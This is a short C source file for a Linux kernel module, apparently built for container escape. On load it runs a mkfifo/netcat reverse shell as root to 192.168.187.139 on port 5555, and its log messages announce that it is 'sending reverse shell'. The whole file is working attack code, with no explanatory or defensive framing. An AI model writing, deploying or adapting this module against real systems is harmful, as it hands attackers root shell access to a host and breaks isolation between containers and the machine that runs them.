#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");

static int __init escape_init(void) {
char *argv[] = {
    "/bin/sh",
    "-c",
    "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.187.139 5555 > /tmp/f",
    NULL
};
    static char *envp[] = {
        "HOME=/root",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL
    };
    printk(KERN_INFO "[+] Escape module loaded, sending reverse shell...\n");
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return 0;
}

static void __exit escape_exit(void) {
    printk(KERN_INFO "[-] Escape module unloaded\n");
}

module_init(escape_init);
module_exit(escape_exit);